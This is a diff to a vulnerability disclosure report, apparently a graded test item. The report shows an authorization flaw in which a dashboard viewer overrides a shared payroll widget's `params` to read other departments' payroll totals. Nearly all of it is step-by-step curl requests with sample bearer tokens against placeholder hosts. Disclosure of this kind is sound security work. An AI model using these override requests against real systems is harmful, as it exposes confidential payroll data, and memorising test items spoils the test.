@@ -12,14 +12,14 @@ category: Disclosure & Reporting Formats
 
 **CVSS:** CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:L/I:N/A:N (4.3)
 
-**Asset:** GET https://home.meridianops.example/api/dashboard-widgets/{widget_id}/data
+**Asset:** GET https://home.acme.example/api/dashboard-widgets/{widget_id}/data
 **Pass if:** step 11 returns department `executive` with a total and `calculated_at` that differ from step 7's engineering read, and step 4 returns status `error` naming the widget's own creator
 
 ---
 
 ### Summary
 
-A Acme Operations user the organization denies Payroll access runs their own Payroll query through a colleague's shared dashboard widget. I hold no Payroll role and I'm refused at Payroll's own API. A `params` override on the widget-data route still returns a live computation for a department the widget's creator never configured. The route authorizes on the widget's stored creator, not the requester, and never re-checks an override's target against anyone's permission.
+An Acme Operations user the organization denies Payroll access runs their own Payroll query through a colleague's shared dashboard widget. I hold no Payroll role and I'm refused at Payroll's own API. A `params` override on the widget-data route still returns a live computation for a department the widget's creator never configured. The route authorizes on the widget's stored creator, not the requester, and never re-checks an override's target against anyone's permission.
 
 **Exploit flow**
 1. A Payroll admin creates a dashboard widget scoped to one department and shares the dashboard with an ordinary viewer.
@@ -30,122 +30,122 @@ A Acme Operations user the organization denies Payroll access runs their own Pay
 
 ### Steps to Reproduce
 
-1. [attacker] Confirm the Viewer account holds no Payroll role, reading Viewer's own permission record as Admin.
+1. [administrator] Confirm the Viewer account holds no Payroll role by reading its permission record.
 ```
-curl -s -H "Authorization: Bearer $ADMIN_TOKEN" \
-  https://payroll.meridianops.example/api/permissions/$VIEWER_ID
+curl -s -H "Authorization: Bearer adm_9fK2qL7vXc4R8tWb" \
+  https://payroll.acme.example/api/permissions/per_51c7e0a2
 ```
 **Expect:** `{"payroll_access": "none"}`.
 2. [attacker] Confirm Viewer is refused directly at Payroll's own API, using Viewer's session.
 ```
-curl -s -o /dev/null -w '%{http_code}\n' -H "Authorization: Bearer $VIEWER_TOKEN" \
-  "https://payroll.meridianops.example/api/payroll/summary?department=engineering"
+curl -s -o /dev/null -w '%{http_code}\n' -H "Authorization: Bearer vwr_3Tn8wPz1Hd6MkQ5y" \
+  "https://payroll.acme.example/api/payroll/summary?department=engineering"
 ```
 **Expect:** 403.
-3. [attacker] As Viewer, create a dashboard and add a Payroll widget, so the widget's own creator is the Viewer.
+3. [attacker] Create a dashboard and add a Payroll widget, so the widget's own creator is the Viewer.
 ```
-DASH_V=$(curl -s -X POST -H "Authorization: Bearer $VIEWER_TOKEN" -H "Content-Type: application/json" \
-  -d '{}' https://home.meridianops.example/api/dashboards | jq -r .id)
-WIDGET_V=$(curl -s -X POST -H "Authorization: Bearer $VIEWER_TOKEN" -H "Content-Type: application/json" \
+DASH_V=$(curl -s -X POST -H "Authorization: Bearer vwr_3Tn8wPz1Hd6MkQ5y" -H "Content-Type: application/json" \
+  -d '{}' https://home.acme.example/api/dashboards | jq -r .id)
+WIDGET_V=$(curl -s -X POST -H "Authorization: Bearer vwr_3Tn8wPz1Hd6MkQ5y" -H "Content-Type: application/json" \
   -d '{"widget_type":"payroll_department_total","params":{"department":"engineering"}}' \
-  https://home.meridianops.example/api/dashboards/$DASH_V/widgets | jq -r .id)
+  https://home.acme.example/api/dashboards/$DASH_V/widgets | jq -r .id)
 ```
 **Expect:** 201 on both.
-4. [attacker] As Viewer, poll that widget's data until it settles.
+4. [attacker] Poll that widget's data until it settles.
 ```
-curl -s -H "Authorization: Bearer $VIEWER_TOKEN" \
-  https://home.meridianops.example/api/dashboard-widgets/$WIDGET_V/data
+curl -s -H "Authorization: Bearer vwr_3Tn8wPz1Hd6MkQ5y" \
+  https://home.acme.example/api/dashboard-widgets/$WIDGET_V/data
 ```
 **Expect:** `status: "error"`, naming Viewer as the creator lacking Payroll access.
-5. [attacker] As Admin, seed a real payroll batch for the Engineering department.
+5. [administrator] Seed a real payroll batch for the Engineering department.
 ```
-curl -s -X POST -H "Authorization: Bearer $ADMIN_TOKEN" -H "Content-Type: application/json" \
+curl -s -X POST -H "Authorization: Bearer adm_9fK2qL7vXc4R8tWb" -H "Content-Type: application/json" \
   -d '{"department":"engineering","period":"2026-07","total_cents":84230000}' \
-  https://payroll.meridianops.example/api/payroll/batches
+  https://payroll.acme.example/api/payroll/batches
 ```
 **Expect:** 201, `total_cents: 84230000`.
-6. [attacker] As Admin, create a dashboard and add a Payroll widget scoped to Engineering.
+6. [administrator] Create a dashboard and add a Payroll widget scoped to Engineering.
 ```
-DASH_A=$(curl -s -X POST -H "Authorization: Bearer $ADMIN_TOKEN" -H "Content-Type: application/json" \
-  -d '{}' https://home.meridianops.example/api/dashboards | jq -r .id)
-WIDGET_A=$(curl -s -X POST -H "Authorization: Bearer $ADMIN_TOKEN" -H "Content-Type: application/json" \
+DASH_A=$(curl -s -X POST -H "Authorization: Bearer adm_9fK2qL7vXc4R8tWb" -H "Content-Type: application/json" \
+  -d '{}' https://home.acme.example/api/dashboards | jq -r .id)
+WIDGET_A=$(curl -s -X POST -H "Authorization: Bearer adm_9fK2qL7vXc4R8tWb" -H "Content-Type: application/json" \
   -d '{"widget_type":"payroll_department_total","params":{"department":"engineering"}}' \
-  https://home.meridianops.example/api/dashboards/$DASH_A/widgets | jq -r .id)
+  https://home.acme.example/api/dashboards/$DASH_A/widgets | jq -r .id)
 ```
 **Expect:** 201 on both.
-7. [attacker] As Admin, poll until status is ok, then read the widget's stored configuration before any override.
+7. [administrator] Poll until status is ok, then read the widget's stored configuration before any override.
 ```
-curl -s -H "Authorization: Bearer $ADMIN_TOKEN" \
-  https://home.meridianops.example/api/dashboard-widgets/$WIDGET_A/data
+curl -s -H "Authorization: Bearer adm_9fK2qL7vXc4R8tWb" \
+  https://home.acme.example/api/dashboard-widgets/$WIDGET_A/data
 ```
 **Expect:** `status: "ok"`, `department: "engineering"`, `total_cents: 84230000`.
-8. [attacker] Before sharing anything, as Viewer, fetch that widget by id.
+8. [attacker] Before anything is shared, fetch that widget by id.
 ```
-curl -s -o /dev/null -w '%{http_code}\n' -H "Authorization: Bearer $VIEWER_TOKEN" \
-  https://home.meridianops.example/api/dashboard-widgets/$WIDGET_A/data
+curl -s -o /dev/null -w '%{http_code}\n' -H "Authorization: Bearer vwr_3Tn8wPz1Hd6MkQ5y" \
+  https://home.acme.example/api/dashboard-widgets/$WIDGET_A/data
 ```
 **Expect:** 404.
-9. [attacker] As Admin, share the dashboard with Viewer as a viewer collaborator.
+9. [administrator] Share the dashboard with Viewer as a viewer collaborator.
 ```
-curl -s -X POST -H "Authorization: Bearer $ADMIN_TOKEN" -H "Content-Type: application/json" \
-  -d "{\"person_id\":\"$VIEWER_ID\",\"role\":\"viewer\"}" \
-  https://home.meridianops.example/api/dashboards/$DASH_A/collaborators
+curl -s -X POST -H "Authorization: Bearer adm_9fK2qL7vXc4R8tWb" -H "Content-Type: application/json" \
+  -d "{\"person_id\":\"per_51c7e0a2\",\"role\":\"viewer\"}" \
+  https://home.acme.example/api/dashboards/$DASH_A/collaborators
 ```
 **Expect:** 201.
-10. [attacker] As Viewer, fetch the shared widget as-is, with no override.
+10. [attacker] Fetch the shared widget as-is, with no override.
 ```
-curl -s -H "Authorization: Bearer $VIEWER_TOKEN" \
-  https://home.meridianops.example/api/dashboard-widgets/$WIDGET_A/data
+curl -s -H "Authorization: Bearer vwr_3Tn8wPz1Hd6MkQ5y" \
+  https://home.acme.example/api/dashboard-widgets/$WIDGET_A/data
 ```
 **Expect:** `status: "ok"`, `department: "engineering"`, `total_cents: 84230000` — the creator's own configured view.
-11. [attacker] As Viewer, repeat that request with a `params` override naming a department the widget was never configured for.
+11. [attacker] Repeat that request with a `params` override naming a department the widget was never configured for.
 ```
-curl -s -G -H "Authorization: Bearer $VIEWER_TOKEN" \
+curl -s -G -H "Authorization: Bearer vwr_3Tn8wPz1Hd6MkQ5y" \
   --data-urlencode 'params={"department":"executive"}' \
-  https://home.meridianops.example/api/dashboard-widgets/$WIDGET_A/data
+  https://home.acme.example/api/dashboard-widgets/$WIDGET_A/data
 ```
 **Expect:** `status: "ok"`, `department: "executive"`, a new `calculated_at`, a total Viewer has no other way to see.
-12. [attacker] As Admin, seed a second payroll batch and widget scoped to Sales, and share that dashboard too.
+12. [administrator] Seed a second payroll batch and widget scoped to Sales, and share that dashboard too.
 ```
-curl -s -X POST -H "Authorization: Bearer $ADMIN_TOKEN" -H "Content-Type: application/json" \
+curl -s -X POST -H "Authorization: Bearer adm_9fK2qL7vXc4R8tWb" -H "Content-Type: application/json" \
   -d '{"department":"sales","period":"2026-07","total_cents":51900000}' \
-  https://payroll.meridianops.example/api/payroll/batches
-DASH_A2=$(curl -s -X POST -H "Authorization: Bearer $ADMIN_TOKEN" -H "Content-Type: application/json" \
-  -d '{}' https://home.meridianops.example/api/dashboards | jq -r .id)
-WIDGET_A2=$(curl -s -X POST -H "Authorization: Bearer $ADMIN_TOKEN" -H "Content-Type: application/json" \
+  https://payroll.acme.example/api/payroll/batches
+DASH_A2=$(curl -s -X POST -H "Authorization: Bearer adm_9fK2qL7vXc4R8tWb" -H "Content-Type: application/json" \
+  -d '{}' https://home.acme.example/api/dashboards | jq -r .id)
+WIDGET_A2=$(curl -s -X POST -H "Authorization: Bearer adm_9fK2qL7vXc4R8tWb" -H "Content-Type: application/json" \
   -d '{"widget_type":"payroll_department_total","params":{"department":"sales"}}' \
-  https://home.meridianops.example/api/dashboards/$DASH_A2/widgets | jq -r .id)
-curl -s -X POST -H "Authorization: Bearer $ADMIN_TOKEN" -H "Content-Type: application/json" \
-  -d "{\"person_id\":\"$VIEWER_ID\",\"role\":\"viewer\"}" \
-  https://home.meridianops.example/api/dashboards/$DASH_A2/collaborators
+  https://home.acme.example/api/dashboards/$DASH_A2/widgets | jq -r .id)
+curl -s -X POST -H "Authorization: Bearer adm_9fK2qL7vXc4R8tWb" -H "Content-Type: application/json" \
+  -d "{\"person_id\":\"per_51c7e0a2\",\"role\":\"viewer\"}" \
+  https://home.acme.example/api/dashboards/$DASH_A2/collaborators
 ```
 **Expect:** 201 on the batch, both widget creates, and the share.
-13. [attacker] As Viewer, override the second widget's params to a third department neither widget was configured for.
+13. [attacker] Override the second widget's params to a third department neither widget was configured for.
 ```
-curl -s -G -H "Authorization: Bearer $VIEWER_TOKEN" \
+curl -s -G -H "Authorization: Bearer vwr_3Tn8wPz1Hd6MkQ5y" \
   --data-urlencode 'params={"department":"finance"}' \
-  https://home.meridianops.example/api/dashboard-widgets/$WIDGET_A2/data
+  https://home.acme.example/api/dashboard-widgets/$WIDGET_A2/data
 ```
 **Expect:** `status: "ok"`, `department: "finance"`, a live total.
-14. [attacker] As Viewer, confirm still refused directly at Payroll's own API.
+14. [attacker] Confirm Viewer is still refused directly at Payroll's own API.
 ```
-curl -s -o /dev/null -w '%{http_code}\n' -H "Authorization: Bearer $VIEWER_TOKEN" \
-  "https://payroll.meridianops.example/api/payroll/summary?department=finance"
+curl -s -o /dev/null -w '%{http_code}\n' -H "Authorization: Bearer vwr_3Tn8wPz1Hd6MkQ5y" \
+  "https://payroll.acme.example/api/payroll/summary?department=finance"
 ```
 **Expect:** 403, unchanged from step 2.
-15. [attacker] As Viewer, attempt to persist the override into the widget's own stored configuration instead of a per-request param.
+15. [attacker] Attempt to persist the override into the widget's own stored configuration instead of a per-request param.
 ```
-curl -s -o /dev/null -w '%{http_code}\n' -X PATCH -H "Authorization: Bearer $VIEWER_TOKEN" -H "Content-Type: application/json" \
+curl -s -o /dev/null -w '%{http_code}\n' -X PATCH -H "Authorization: Bearer vwr_3Tn8wPz1Hd6MkQ5y" -H "Content-Type: application/json" \
   -d '{"params":{"department":"executive"}}' \
-  https://home.meridianops.example/api/dashboards/$DASH_A/widgets/$WIDGET_A
+  https://home.acme.example/api/dashboards/$DASH_A/widgets/$WIDGET_A
 ```
 **Expect:** 403 — Viewer cannot modify Admin's widget, only override a single read of it.
-16. [attacker] As Admin, delete both dashboards and both payroll batches.
+16. [administrator] Delete all three dashboards and both payroll batches.
 ```
-curl -s -X DELETE -H "Authorization: Bearer $ADMIN_TOKEN" https://home.meridianops.example/api/dashboards/$DASH_V
-curl -s -X DELETE -H "Authorization: Bearer $ADMIN_TOKEN" https://home.meridianops.example/api/dashboards/$DASH_A
-curl -s -X DELETE -H "Authorization: Bearer $ADMIN_TOKEN" https://home.meridianops.example/api/dashboards/$DASH_A2
-curl -s -X DELETE -H "Authorization: Bearer $ADMIN_TOKEN" "https://payroll.meridianops.example/api/payroll/batches?period=2026-07"
+curl -s -X DELETE -H "Authorization: Bearer adm_9fK2qL7vXc4R8tWb" https://home.acme.example/api/dashboards/$DASH_V
+curl -s -X DELETE -H "Authorization: Bearer adm_9fK2qL7vXc4R8tWb" https://home.acme.example/api/dashboards/$DASH_A
+curl -s -X DELETE -H "Authorization: Bearer adm_9fK2qL7vXc4R8tWb" https://home.acme.example/api/dashboards/$DASH_A2
+curl -s -X DELETE -H "Authorization: Bearer adm_9fK2qL7vXc4R8tWb" "https://payroll.acme.example/api/payroll/batches?period=2026-07"
 ```
 **Expect:** 204 on each; re-running step 8 on either widget then returns 404, and both departments' payroll totals return to zero.
 
